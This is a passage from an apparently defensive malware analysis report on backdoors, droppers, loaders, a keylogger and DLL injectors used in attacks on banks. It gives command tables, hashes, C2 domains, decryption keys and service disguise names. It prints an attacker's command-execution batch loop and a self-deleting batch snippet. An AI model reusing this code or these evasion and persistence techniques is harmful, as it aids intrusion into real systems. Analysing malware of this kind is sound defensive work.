command as another Terminal Session user.  \n0x91B93492  Delete file(s) based on file path pattern.  \n0x91B934A1  Wipe specified file two times with random DWORD value.  0x91B9348B  Compress and upload specified file path recursively.  \n0x91B9348A  Read data from the specified file.  \n0x91B93489  Write data to the specified file.  \n0x91B93495  Get detailed process information: PID, Session ID, CPU performance \nstatus, memory used, full path.  \n0x91B93491  Kill process by name or PID.  \n0x91B9348C  Execute a comman d and read the output. This is done via the \nredirection of command output to a text file in temp directory, reading \nand sending the contents of the file after the process is complete.  \n0x91B934A5  Connect 1024 times to localhost:135 for disguise, cleanup an d \nshutdown.  \n0x91B934A4  Get current backdoor configuration.  \n0x91B934A3  Set new backdoor configuration.  \n0x91B934A2  Test remote host and port by opening TCP connection.  \n0x91B934A7  Inject an executable module into address space of explorer.exe.  \n0x91B93499  Get current working directory.  \n0x91B9349C  Delete specified file.  \n \nThe same file , but compressed with an unknown packer , was discovered uploaded on VT from \nPoland and Korea in November 2016. This suggests backdoor reuse in those countries. It has \nthe following properties:  \n \nName: IMEKLMG.exe.dmp  \nMD5: 06cd99f0f9f152655469156059a8ea25  \nSHA1: 77c7a17ccd4775b2173a24cd358ad3f2676c 3452  \nFile size: 376832 bytes  \nFile type: PE32 executable (GUI) Intel 80386, for MS Windows  \nLink time: 2016.06.14 11:56:42 (GMT)  \nLinker version: 6.0  \n \nAnother similar file was discovered in February 2017 , distributed from a Nigerian webserver. It is \na similar  backdoor but is packed with Obsidium packer.  \nHere is the file's general information:  \n \nMD5: 09a77c0cb8137df82efc0de5c7fee46e  \nSHA1: 964ba2c98b42e76f087789ab5f64e75dd370841a  \n File size: 176640 bytes  \nFile type: PE32 executable (GUI) Intel 80386, for MS Windo ws \nLink time: 2017.02.02 04:20:19 (GMT)  \nLinker version: 10.0  \n \nThis file is similar to the other backdoors from the arsenal . However , it contains some \ndifferences and improvements. It uses an external file to store configuration, located at \n%SYSTEMROOT% \\systray.dat. The config has a fixed size of 182 bytes and has the following \nstructure:  \n \n \n \nXORed with 0xDE  \n \nRandom 4 bytes  Magic Value: 0x12458FAE  Other data  \n \n \nSimilar to other backdoors , it uses XOR operation on the DNS response. The XOR DWORD \nconstant is different here: 0xCBF9A345 . The sample contains the following default hardcoded \nC2 address:  \n \n● tradeboard.mefound[.]com:443  \n \nTo complicate analysis , the developer has implemented a protoc ol with dynamically chang ing \nconstants depending on the variant of the malware. So far, the backdoor \"speaks the same \nlanguage\" but with a different \"dialect\". This is implemented through a different base for all \nmessages. This sample supports similar comm ands but its Command IDs are shuffled and start \nwith a  different number.  \nCommand ID  \n Description  \n0x23FAE29C  Get system information: hostname, OS version, locale, list of network \ninterface cards with properties.  \n0x23FAE2A4  Sleep command. Disconnect from C2. Save current time and show \nno network activity for specified time.  \n0x23FAE2A6  Hibernate command. Disconnect from C2 and show no network \nactivity. This is persistent over program restarts, because it the \nmodule saves time when to come back online in th e config file.  \n0x23FAE29E  List all available drives.  \n0x23FAE2A9  Recursively list contents of the specified directory.  \n0x23FAE2A7  List contents of the specified directory.  0x23FAE29F  Change current directory.  \n0x23FAE2AA  Run specified command.  \n0x23FAE2A8  Delete file(s) based on file path.  \n0x23FAE2AD  Wipe specified file two times with random DWORD value.  \n0x23FAE2B1  Compress and upload specifed file path recursively.  \n0x23FAE2A0  Read data from the specified file.  \n0x23FAE2A1  Write data to the sp ecified file.  \n0x23FAE2A2  Get detailed process information: PID, Session ID, CPU performance \nstatus, memory used, full path.  \n0x23FAE2AC  Kill process by name or PID.  \n0x23FAE2AB  Execute a command and read the output. This is done via redirection \nof command  output to a text file in temp directory, reading and \nsending the contents of the file after the process is complete.  \n0x23FAE29D  Clone file timestamps from the given path.  \n0x23FAE2AF  Set new C2 port, save configuration file.  \n0x23FAE2B0  Set new C2 addres s, save configuration file.  \n0x23FAE2A3  Command to self -destruct. It drops ieinst.bat into %TEMP% directory \nand runs it to self -delete.  \n:L1 \ndel \"%S\"  \nnping 0  \nif exist \"%S\" goto L1  \ndel \"%0\"  \nIn addition it wipes the config  file with zeroes and deletes the file as \nwell. \n0x23FAE2A5  Terminate session and quit immediately.  \n \nThis matches the description of backdoors from the Romeo set as per Novetta . \n \nMalware 7: Passive Backdoors  \nMD5: b9be8d53542f5b4abad4687a891b1c03  \nType: PE32 executable (GUI) Intel 80386, for MS Windows  \nSize: 102'400 bytes  \nNames: hkcmd.exe  \nInternal name: compact.exe  Link time: 2016.01.08 16:41:18 (GMT)  \nLinker version: 6.0  \nProduct name (file version info): Windows Firewall Remote Management  \nUsed in: Incident #1  \n \nThis executable was written using the Microsoft MFC framework. The application is designed to \nrun as a service , however it can also start and work as a standalone non -service process . It \nregisters with the name of \"helpsvcs\". The code is organized in classes, one of which, the main \napplication class, has a static text variable set to \"PVS\", which seems to be unused  in the code. \nThis service relies on command line argument s passed as an integer defining the port number \nthat it will listen to in the future. This is a reduced minimalistic way of configur ing and us ing the \nbackdoor in listening mode, however there is a c lass that is responsible for loading or saving full \nconfiguration block from/to the registry.  \n \nThe registry value used to store the configuration depends on the parameter value \n(%parameter%) passed to the function. The registry configuration is located at \nHKCR \\NR%parameter% \\Content Setting.  \n \nThe m ain service procedure generates a unique instance ID which is set to pseudo -randomly \nselected 8 bytes. Some previous version s of the code relied on some pseudo -random value s \nderived from the current time and MAC ad dresses of available network cards, but then was \nchanged to a hardware independent value.  \n \nThis backdoor takes care of enabling port s in the Windows Firewall by creating a new firewall \nrule named \"Windows Firewall Remote Management\" using netsh.exe tool on  Windows, which \nenables an incoming connection to any executable on the TCP port that is currently used by the \nbackdoor. In case this rule has different name in other samples, it's quite easy to find it , \nbecause it doesn't specify which group of rules it b elongs to, unlike all other default Windows \nFirewall rules. Sorting Firewall rules by group name may quickly reveal such an odd rule:  \n \n \n \nThe backdoor provides process and file management, as well as the creation of TCP connection \nrelays.  \n \nAnother backdoor based on the same code was found in the same bank, however it was made \nas a standalone executable instead of a DLL. Short description and file properties are provided \nbelow:  \n \nMD5: bbd703f0d6b1cad4ff8f3d2ee3cc073c  \nLink time: 2014.09.22 13:1 2:17 (GMT)  \nLinker version: 6.0  \nSize: 106'496 bytes  \nExport section timestamp: Fri Jan  8 16:41:26 UTC 2016  \nOriginal name: fmapi.dll  \nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows  \nUsed in: Incident #1  \nThis file is a backdoor that listens to a port specified in the %WINDIR% \\temp \\scave.dat  file as \nan integer number. It supports about 20 commands, which enable the operator to : \n● Collect general system information  \n● Search files/directories by name  \n● Start new process as current user  \n● Start process as another logged in user  \n● Start process and collect output from stdout  \n● Get file from specified path  \n● Drop new executables into system directory  \n● Compress and download files  \n● List processes and their respective loaded modules  \n● Kill process es by name  \n● Fake file time stamp by copying it from kernel32.dll  \n● Start a new backdoor session on another port  \n● List active terminals sessions with details  \n● Relay TCP connections to a remote host  \n \nThe executable contains a custom PE loader code that is identical to a custom PE loader f rom \nLazarus Loader modules dubbed by Novetta  as LimaAlfa.  \n \nThis module contains a small embedded executable  in the data section , encrypted with a trivial \n(xor 0xb1, add 0x4f) method. The MZ header is wiped from that embedded file and is restored \nduring decryption routine. Some other properties of the small embedded file are listed below \n(MD5: 8387ceba0c020a650e 1add75d24967f2). This executable module is used to force \nunloading a DLL from memory.  \n \nMalware 8: Trojan Dropper  \nDiscovered path: C: \\WINDOWS \\igfxpers.exe  \nMD5: 6eec1de7708020a25ee38a0822a59e88  \nSize: 253'952 bytes  \nTime modified: 2016 -01-18 06:08:36 (GMT)  Time accessed: 2016 -08-22 12:38:37 (GMT)  \nTime changed: 2016 -08-22 13:04:42 (GMT)  \nTime created: 2016 -01-18 06:08:32 (GMT)  \nLink time: 2014 -09-22 13:12:17 (GMT)  \nLinker version: 6.0  \nOther filenames: hkcmd.exe  \nUsed in: Incident #1  \n  \nThis is a dropper of an embedded malware. It uses RC4 to decrypt resource s and drop and start \na new process from disk. The RC4 is an MD5 of a command  line argument (secret passphrase) \nfollowing \" -x\" parameter. The second command line argument \" -e\" defines the name for the new \nservice to be registered. The MD5 hash of the passphrase is stored in the registry and is used \nby the DLL Loader in the later stage.  \n \nThe binary picks one of the names to drop the payload to , and chooses a corresponding service \ndescription when registering.  \n \nFileName  Description  \nwanmgr  WiFi Connection Management Service  \nvrddrv  Windows Virtual Disk Service  \ntrufont  Font Cache Service  \nwmvdec  Media Center Network Sharing  \nbiomgs  Biometric Service  \ngpcpolicy  Group Policy Server Service  \ndiagmgs  Diagnostic Policy Client  \nwaindex  Windows Indexing Service  \ntrabcon  Network Traffic Balancing Service  \nauthen  Remote Logon Authentication  \n \nThe dropped file is saved into %SYSTEMROOT% \\System32 \\%FileName%.dll  on Windows 32 -\nbit and %SYSTEMROOT% \\SysWow64 \\%FileName%.dll  on Windows 64 -bit.  \n \nKnown command  line usage:  \nhkcmd.exe -x <passphrase> -e LogonHours  \n \nWe managed to find the right password (20+ characters long) , which enabled us to decrypt the \npayload.  Malware 9: DLL Loader  \nMD5: 268dca9ad0dcb4d95f95a80ec621924f  \nLink time: 2014.12.08 13:12:17 (GMT)  \nLinker version: 6.0  \nSize: 192'512 bytes  \nExport section timestamp: Fri Jan  8 16:54:25 UTC 2016  \nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows  \nOriginal name: ext -ms-win-ntuser -dialogbox -l1-1-0.dll \nUsed in: Inci dent #1  \nThis file is dropped by the Trojan Dropper described above. It is a malware loader service, \nwhich gets the decryption key from the registry, uses RC4 to decrypt an embedded resource \nand start the payload. The RC4 decryption key is obtained from \nHKC R\\NR%parameter% \\ContextHandler  value, which is set by the Trojan Dropper during \nmalware installation.  \nThe embedded resource contains one of the Passive Backdoors described in this paper.  \n \nAnother variant of the DLL loader heavily uses system registry to fe tch the decryption key, and \nthe encrypted payload.  \n \nName: lcsvsvc.dll  \nMD5: c635e0aa816ba5fe6500ca9ecf34bd06  \nSHA1: d7d724718065b2f386623dfaa8d1c4d22df7b72c  \nSHA256: 93e7e7c93cf8060eeafdbe47f67966247be761e0dfd11a23a3a055cf6b634120  \nFile size: 1'545'216 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2015.12.09 14:12:41 (GMT)  \nExp. time: 2016.03.19 18:32:34 (GMT)  \nLinker version: 10.0  \nExport module Name: msshooks.dll  \nUsed in: Incident #2  \n \nThis module is similar to other 64 -bit variants . However, it is registered as a service and gets  an \nRC4 key and the payload from the registry values of its own service. The name of the service is \nnot fixed and is probably set during installation stage . \n  \nHere is the registry value path for the RC4 key and encrypted payload respectively:  \nHKLM \\SYSTEM \\CurrentControlSet \\Services \\%SERVICENAME% \\Security \\Data2  \nHKLM \\SYSTEM \\CurrentControlSet \\Services \\%SERVICENAME% \\Security \\Data0  \n \n  The code gets the 16 -bytes RC4 key from the registry ( f9 65 8b c9 ec 12 f 9 ae 50 e6 26 d7 70 \n77 ac 1e ) and encrypted payload, decrypts the payload with that key and then decrypts it one \nmore time with the following hardcoded key (previously seen in  the backdoor management tool): \n53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6 C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 \nB3 9F 15  \n \nThe final decrypted payload is loaded and started as a DLL in memory. At the time of analysis \nthe attackers managed to wipe the payload in the registry with a benign system file data, so only \nthe RC4 key rema ined untouched and was found in the registry.  \nMalware 10: Keylogger  \nMD5: 5ebfe9a9ab9c2c4b200508ae5d91f067  \nKnown filenames: NCVlan.dat  \nFile size: 73'216 bytes  \nType: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.04.06 07:38:57 (GMT)  \nLinker version: 10.0  \nOriginal name: grep.dll  \nUsed in: Incident #1  \n \nThis module is a user -mode keylogger. It contains an export function with an empty name, \nwhich has the main functionality of the module.  \n \nUpon start ing it creates a new thread, which suggests that it has to be loaded by a custom PE \nloader (probably by  the DLL Injector described in this paper, MD5: \n949e1e35e09b25fca3927d3878d72bf4). The main thread registers a new class named \"Shell \nTrayCls%RANDOM%\", wher e %RANDOM% value is an integer returned by the system rand \nfunction seeded with the current system time. Next , it creates a window called \"Shell \nTray%RANDOM%\". The new window registers a system -wide keyboard hook and starts \nrecording keypresses and Unicode  text in context of the clipboard. The data is saved into  a \ncurrent user profile directory in a file that is named after the username via the following template \nstring:  \n \nNTUSER{%USERNAME%}.TxS.blf . For example , the full path that we discovered was \n\"C:\\User s\\[redacted] \\NTUSER.DAT{[redacted operator ]}.TxS.blf\". The data written in the file is \nencrypted with RC4 with the following hardcoded 64 -bytes key:  \n \n53 55 4D A2 30 55 53 44  30 2C 30 3E 27 44 42 54  \n20 4C 49 4D 49 54 43 55  53 44 30 2C 0D 0A 43 44  \n54 19 53  55 4D 7F 31 55  53 44 32 36 35 2C 30 E4  \n37 43 44 54 98 4C 49 4D  49 54 1B 55 53 44 30 2C  \n \n  The RC4 key is not entirely random and seems to contain chunks of readable ASCII text related \nto some database contents or quer ies: \n \n● \"SUM.0USD0,0>'DBT LIMITCUSD0, ..CDT.SUM.1USD265,0.7CDT.LIMIT.USD0, \" \n \nWe assume this is done to complicate the recognition of a password -like string by eye , or use a \nvalue that would cause some false -positives when scanning for such a pattern.  \n \nThe keylogger  data file is a binary log that contains sequences of records organized in blocks \nwhich have the following events inside:  \n1. Session Start (Logon):  \nContains username, type of session (rdp, console, etc),  session id.  \n2. Session Activity:  \nContains active windows name and sequence of typed keys.  \n3. Session End (Logoff):  \nContains username, session id.  \nEvery event record contains a DWORD timestamp.  \n \nThe module also starts a watchdog thread that keeps monitoring the creation of a trigger -file \ncalled ODBCREP.HLP in the di rectory of the current DLL. If such file is found , the keylogger \nremoves the keyboard hook and unloads from the process immediately.  \n \nMalware 11: Trojan Dropper 2  \nFilename: gpsvc.exe  \nMD5: 1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae  \nSHA1: bedceafa2109139c793cb158cec9f a48f980ff2b  \nFile Size: 3449344 bytes  \nFile Type: PE32+ executable (console) x86 -64, for MS Windows  \nLink Time: 2016.12.08 00:53:20 (GMT)  \nLinker version: 10.0  \nUsed in: Polish bank  \n \nThis module is a command  line malware dropper/installer, which contains two da ta containers in \nthe resource section.  \n \nThe dropper command line takes the following:  \ngpsvc.exe -e %name%  - drop payload on disk  \ngpsvc.exe -l - lists all registered services under netsvcs registry key3. \ngpsvc.exe -a %param2% %param3% - registers a news se rvice using %param2% as the \nservice name and %param3% as the path to DLL file of service binary. If the %param3% \ndoesn't contain \" \\\" character, the code uses it as the filename in %SYSTEMROOT% \\System32 \\. \n                                                \n3HKLM \\Software \\Microsoft \\Windows NT \\CurrentVersion \\Svchost \\netsvcs  When -e option is used, the files stored in the cont ainers are extracted, decrypted where \nencryption is used , and dropped to a disk in two locations: one goes to the current directory as \n%name% , another is saved into %SYSTEMROOT% \\Help \\%name%.chm . The value of the \n%name% parameter is passed via command line argument.  \n \nThe container starts with a 40 bytes header describing the start of the payload, container and \nthe payload data inside. The data may or may not be encrypted and there is no specific flag \nidentifying that in container itself. The code processing the container will know whether the \ncontainer's payload requires decryption.  \n \nUpon successful extraction of the files , the dropper will show the following message on the \ncommand  line: \n \nFig. Report of successful payload deployment.  \nThe first extracted file is decrypted using the following key and Spritz algorithm, a variant of the \nRC4 family: 95 B4 08 68 E4 8B 72 94 5E 61 60 BF 3F D7 F9 41 10 9A 4A C4 66 41 99 48 CC \n79 F5 6A FE 5F 12 E5  \n \nThe second file is extracted as -is, however, b rief analysis of its header suggested that it is \nencrypted with the same crypto and key.  \n \nThe dropped files after decryption have the following MD5 hashes:  \nad5485fac7fed74d112799600edb2fbf  \n16a278d0ec24458c8e47672529835117  \n \nMalware 12: DLL Injector  \nMD5: 16a 278d0ec24458c8e47672529835117  \nSHA1: aa115e6587a535146b7493d6c02896a7d322879e  \nFile size: 1515008 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.12.08 00:53:43 (GMT)  \nLinker version: 10.0  \nExport module name: wide_loader.d ll \nUsed in: Incident #2  \n \nThis module is packed with  a commercial product known as  the Enigma Protector , which was \ndeveloped by a Russian software developer Vladimir Sukhov  in 2004. This module is \nimplemented as a service binary with ServiceMain procedure. On start ing it  imports all \nnecessary system API functions, and searches for the .CHM file inside \n%SYSTEMROOT% \\Help\\%name%.chm, where %name% matches the name of current DLL \nmodule. Then it decrypts the payload using the Spritz algorithm with the hardcoded key: 95 B4 \n08 68 E4 8B 72 94 5E 61 60 BF 3F D7 F9 41 10 9A 4A C4 66 41 99 48 CC 79 F5 6A FE 5F 12 \nE5 \n \nNext, it searches the target process and attempts to inject the decrypted  payload module from \nthe CHM file into the address space of the target process. The target process can be one of \ntwo: \n1. lsass.exe  \n2. itself (current service process)  \nThe process to inject the code is hardcoded and defined during the compilation of the module. \nAccording to the code  the current module injects payload into itself.  \n \nSome more similar DLL Injector samples were found in Europe and in the Middle East. The \nfollowing files were discovered:  \n \nFilename: srservice.dll  \nMD5: e29fe3c181ac9ddbb242688b151f3310  \nSHA1: 7260340b7d7b08b7a9c7e27d9226e17b7170a436  \nFile size: 79360 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.10.22 07:08:16 (GMT)  \nExp. time: 2016.10.22 07:08:16 (GMT)  \nLinker version: 10.0  \nExport module name: wide_loa der.dll  \nUsed in: Incident #2  \nFilename: msv2_0.dll  \nMD5: 474f08fb4a0b8c9e1b88349098de10b1  \nSHA1: 487f64dc8e98e443886b994b121f4a0c3b1aa43f  \nFile size: 78848 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.12.08 00:53:39 (GM T) \nExp. time: 2016.12.08 00:53:39 (GMT)  \nLinker version: 10.0  \nExport module name: wide_loader.dll  \nUsed in: Incident #2  \nFilename: SRService.dll  \nMD5: 07e13b985c79ef10802e75aadfac6408  \nSHA1: a0c02ce526d5c348519905710935e22583d81be7  \nFile size: 79360 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  Link time: 2016.10.22 07:08:16  (GMT)  \nExp. time: 2016.10.22 07:08:16 (GMT)  \nLinker version: 10.0  \nUsed in: the Middle East  \n \nThese files are different from those previously seen in DLL Injector, be cause they are not \npacked with Enigma Protector. They also contain different 32 -byte Spritz keys:  \n● 65 06 18 33 60 10 48 F7 57 9B 98 76 CA B5 29 60 71 CB 0B 97 7E D4 A2 F9 22 CC \n4E 79 52 64 4A 75  \n● 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F  91 EB DE DC F6 \nFA 4C 9E 3A 8F 98  \n● 78 CB C3 77 35 5C F2 82  8A 3A 08 71 6A D5 C3 D9 A1 1B 6A BA C5 9C 5D BC  6A \nEC F0 B8 96 49 79 7A  \nThe purpose of these variants is the same - decrypt the corresponding CHM file with the \npayload and inject it in the memory of lsass.exe or current process.  \nThe payloads found in these cases were:  \n● fde55de117cc611826db0983bc054624 (Active Advanced Backdoor Type B)  \n● 17bc6f5b672b7e128cd5df51cdf10d37 (Active Advanced Backdoor Type B)  \n \nMalware 13: Active Backdoors 2  \nFilename:  %name%.chm  \nMD5: ad5485fac7fed74d112799600edb2fbf  \nSHA1: a107f1046f5224fdb3a5826fa6f940a981fe65a1  \nFile size: 1861632 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.12.08 00:55:06 (GMT)  \nExport time: 2016.12.08 00:55:04 ( GMT)  \nLinker version: 10.0  \nExport module name: aclui.dll  \n \nThis module is dropped to the disk in .CHM file and stored in encrypted form. It can be \ndecrypted and started with the DLL Injector module (i.e. \n16a278d0ec24458c8e47672529835117). Like the other file  in the same package , it is wrapped \nwith Enigma Protector.  \n \n  The module has no business logic starting from the entry point. Core logics are called from one \nof two exported functions:  \n● ?DllRegister@@YAX_KK0K0PEAXK@Z (start backdoor with default parameters)  \n● InitDll (start backdoor with configuration passed via parameter)  \nThe InitDll function sets up basic requirements and prepares paths to other essential \ncomponents, which are expected in the following filepaths:  \n%SYSTEMROOT% \\Help \\*.chm  \n%SYSTEMROOT% \\Help \\*.hlp \n \nThe .hlp file from  the Help Directory is loaded and decrypted using Spritz algorithm4 and the \nfollowing key:  \n6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F 91 EB DE DC F6 FA 4C \n9E 3A 8F 98  \n \nThe module contains an embedded default config  which is saved to .hlp file in encrypted form if \nthe file is missing. It contains the following C2 information:  \n \n● exbonus.mrbasic[.]com:443  \nSimilar to Active Advanced Backdoor Type A (see md5: 2ef2703cfc9f6858ad9527588198b1b6) \nit doesn't use resolved IP of  the C2 directly, but XORs the DNS query result with hardcoded key \n0x4F833D5B . \n \nThe backdoor protocol supports the following commands sent as a DWORD, however this \nDWORD is convertible to a meaningful ASCII representation of the command as shown below:  \n \nCommand ID  Description  \nNONE  No actions.  \nGINF  Get system information: hostname, OS version, CPU type, system locale, \nRAM, disk free space, BIOS version and manufacturer, list of network \ninterface cards with properties.  \nSLEP  Disconnect from C2. Save current time and show no network activity for \nspecified time. It seems like this sleep is persistent over program restarts.  \nHIBN  Disconnect from C2 and show no network activity.  \nDRIV  Show all available drives and used/available s pace on them.  \nDIR List files in specified directory.  \nDIRP  List files and directories recursively starting from specified path.  \nCHDR  Change current directory.  \n                                                \n4 A very similar implementation of the Sprtiz algorithm in C is available at \nhttps://github.com/je disct1/spritz/blob/master/spritz.c  RUN  Run specified command.  \nRUNX  Run specified command as another Terminal Session user.  \nDEL Delete file(s) based on file path pattern.  \nWIPE  Wipe file(s) based on file path pattern. A hardcoded pattern (not defined in \ncurrent sample) or randomly generated bytestream is used. Wiping with \nrandom data is done three times. A DWORD constant is present  from some \nolder wiper's code pattern: 0xE77E00FF.  \nMOVE  Move file.  \nFTIM  Set time for file(s) specified by file path pattern. Use \n%systemroot% \\kernel32.dll as source of timestamps. If kernel32.dll is not \nfound, a hardcoded value is used:  \n12:12:46.493 03 September 2008  \nNEWF  Create a directory.  \nZDWN  Compress and download specified file path recursively.  \nDOWN  Compress and download a single file.  \nUPLD  Upload and uncompress file to the specified directory. The directory is created \nif it doesn't exist.  \nPVEW Get detailed process information: PID, Session ID, CPU performance status, \nmemory used, full path.  \nPKIL  Kill process by name or PID.  \nCMDL  Execute a command and read the output. This is done via redirection of \ncommand output to a text file in temp directory, reading and sending the \ncontents of the file after the process is complete.  \nDIE Set a flag to terminate immediately. Cleanup and shutdown.  \nGCFG  Get current backdoor configuration.  \nSCFG  Set new backdoor configuration.  \nTCON  Test connection with remote hosts. Open TCP connection to the specified host \nand port. Send 2 random bytes to test connection.  \nPEEX  Inject an executable module into address space of explorer.exe.  \nPEIN  Inject an executable module into address space of process defined by PID.  \n \nAn identical file was found in Incident #2:  \nFilename: msv2_0.chm.dec  \nMD5: 17bc6f5b672b7e128cd5df51cdf10d37  \nSHA1: 072245dc2339f8cd8d9d56b479ba5b8a0d581ced  \nFile size: 729088 bytes  File type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.12.08 00:55:06 (GMT)  \nExp. time: 2016.12.08 00:55:04 (GMT)  \nLinker version: 10.0  \nExport module name: aclui.dll  \n \n \nAnother similar file was used during the attack in Incident #2:  \nMD5: fde55de117cc611826db0983bc054624  \nSHA1: 1eff40761643f310a5cd7449230d5cfe9bc2e15f  \nFile size: 729088 bytes  \nFile type: PE32+ executable (DLL) (GUI) x86 -64, for MS Windows  \nLink time: 2016.10.22 07:09:50 (GMT)  \nExp. time: 2016.10.22 07:09:48 (GMT)  \nLinker version: 10.0  \nExport module name: aclui.dll  \n \nThe .hlp file from the H elp Directory is loaded and decrypted using the Spritz algorithm and the \nfamiliar key: 6B EA F5 11 DF 18 6D 74 AF F2 D9 30 8D 17 72 E4 BD A1 45 2D 3F 91 EB DE \nDC F6 FA 4C 9E 3A 8F 98  \nThe .hlp file contains references to two C2 serve rs, which refer to:  \ntradeboard.mefound[.]com:443  \nmovis -es.ignorelist[.]com:443  \n \nThe following table shows connections between known C2s  \nDomain  IP xor Key  \n(Real C2)  CC First Seen  Last Seen  Resolved IP (C2 \ndisguise)  \nexbonus.mrbasic[.]com  218.224.125[.]66  JP 2017 -01-29 2017 -02-06 129.221.254.13  \nexbonus.mrbasic[.]com  82.144.131[.]5  CZ 2017 -02-06 2017 -02-06 9.173.0.74  \ntradeboard.mefound[.]com  218.224.125[.]66  JP 2017 -01-29 2017 -01-31 129.221.254.13  \ntradeboard.mefound[.]com  82.144.131[.]5  CZ 2017 -02-01 2017 -02-06 9.173.0.74  \nmovis -es.ignorelist[.]com  82.144.131[.]5  CZ 2017 -02-01 2017 -02-06 9.173.0.74  \n \nSimilar two 32 -bit based samples were used in an attack on a target in Costa Rica in 2016:  \n● 2de01aac95f8703163da7633993fb447  \n● 5fbfeec97e967325af49fa4f65bb2265  \n  These samples contain the same backdoor commands and rely on the same cryptoalgorithm \nand identical hardcoded crypto key. However , these files do not contain embedded config with \ndefault C2 domain.  \n \n \nMalware 14: Privilege d Execution Batch  \nName: msdtc.bat  \nMD5:  3b1dfeb298d0fb27c31944907d900c1d  \nSHA1: b9353e2e22cb69a9cd967181107113a12197c645  \nSize: 454 bytes  \nType: Windows batch file  \nUsed in: Polish bank  \n \nThe following Windows batch file was found during  a security sweep in one  of the attacked \nbanks:  \n@echo off  \n \nSET cmd_path=C: \\Windows \\Temp \\TMP298.tmp  \n \ncopy NUL %cmd_path%  \n \n:loop  \n \nping -n 1 1.1.1.1 > nul  \n \nfor /f \"tokens=*\" %%a in (%cmd_path%) do (  \n    if \"%%a\" equ \"die\" (  \n     rem del /a %cmd_path%  \n     rem del /a %cmd_path%.ret  \n     echo die >> %cmd_path%.ret  \n     goto end  \n    ) else (  \n     echo %%a >> %cmd_path%.ret  \n     %%a >> %cmd_path%.ret 2>&1  \n     echo --------------------------------------------------------  >> %cmd_path%.ret  \n    ) \n) \n \ncopy NUL %cmd_path%  \ngoto loop  \n \nThe purpose of this file is to execute one or more commands on the command line and redirect \nthe output to a file on disk. The list of commands to run is located in the following file path (let's \ncall it source file): C: \\Windows \\Temp \\TMP298.tmp. Once the comma nds are executed , it sleeps for one second and starts the process again until the source file contains a line with just one \nword in it: \"die\".  \n \nThis batch file opens and runs every command mentioned in the .tmp file and saves the output \nto C: \\Windows \\Temp \\TMP298.tmp.ret. Once it finds the word \"die\" in the source, it deletes the \nsource and the output file and quit s. However , this batch file is either broken or implemented \nwith a bug. Note the line \"goto end\" and no label called \":end\" in the batch file.  \n \nWe can only speculate how this file was used in the real attack, but one theory looks to be the \nmost probable: it was used as an awkward way to execute commands with SYSTEM user \nprivileges. While it is possible to run commands as a SYSTEM user when you hav e \nadministrative privileges on a target machine, getting an interactive shell requires more work. A \nbatch file like this could run in the background, quietly spawning cmd.exe in a loop and non -\nresource exhausting mode. Passing commands to the source file w ould allow attackers to \nconveniently execute them the next second and get the output via another text file. This infinite \nloop could be easily broken with  the \"die\" keyword. So far, we believe that this file could serve \nas a privilege escalation trampoline  for other unprivileged processes ( such as usermode \nbackdoor).  \n \nMalware 14. Backdoor Management Tool  \nFilename: gpsvc.exe  \nMD5: 85d316590edfb4212049c4490db08c4b  \nSHA1: 4f0d7a33d23d53c0eb8b34d102cdd660fc5323a2  \nFile Size: 753664 bytes  \nFile Type: PE32 executable  (console) Intel 80386, for MS Windows  \nLink Time: 2015.08.24 10:21:52 (GMT)  \nLinker version: 8.0  \n \nThis module is a commandline tool that helps to install a new service. In addition it is capable of \ndoing code injection and work s as a service itself. The bin ary is protected with Enigma \nProtector.  \n  \nIf the module is started without commandline arguments, it quits immediately.  \n \nDepending on commandline options passed the tool may work in different modes.  \n1. Service Enumeration Mode  \n Commandline:  gpsvc.exe -l \nThis mode is selected with commandline option -v. In this case the module get a list of \nservices from hardcoded registry value HKLM \\SOFTWARE \\Microsoft \\Windows \nNT\\CurrentVersion \\svchost \\netsvcs . This value is a present on clean Windows installation \nand usua lly contains a list of standard service names that may generate some network activity.  The code iterates through available services and prints to standard output every service \nit managed to open with read privileges (used just to confirm that the service i s running). After \nthis the tool exits.  \n2. Service Activation Mode  \n Commandline:  gpsvc.exe -s %param1% %param2%  \nIn this mode the module registers and starts a new service if it doesn't exist. The service \nname is based on the current executable filename. The fo llowing commandline is stored in the \nregistry to start the service:  \n\"%self_path% \" -k %param1% %param2%  \nWhere %self_path% is full path to current executable and %param1%, %param2% are \npassed as -is from current commandline.  \n3. File Payload Deployment  \n Commandline:  gpsvc.exe -e %param1% %param2%  \n In this mode the module extracts and stores additional executable on the filesystem \n(filepath is inside installation cryptocontainer). It uses %param2% to open the file as a \ncryptocontainer. Cryptocontainer is e ncrypted with two RC4 keys:  \nA. KeyA which is 16 bytes of MD5 value from a string which is passed via %param1%  \nB. KeyB is a hardcoded 32 -byte binary value: 53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 \n60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15  \n It contain s payload data to be installed into registry and some paths.  \n \n4. Registry Payload Deployment  \n Commandline:  gpsvc.exe -f %param1% %param2%  \n This mode is very similar to \" File Payload Deployment \" described above, but in this case \nthe module is instructed to ins tall the payload into the registry value.  \n \n5. Service Test  \n Commandline:  gpsvc.exe -o %param1%  \n This mode is used to ensure that the service is running correctly by checking that a \nspecial event object named %param1% exists.  \n \n6. Service Termination  \n Commandline : gpsvc.exe -t %param1%  \n This mode is used signal the running service via special event object named %param1% \nto terminate execution.  \n \n7. Payload Injection Mode  \n Commandline:  gpsvc.exe -k %param1% %param2%  \n In this mode the module assumes that it can be a service binary, so it tries to behave as 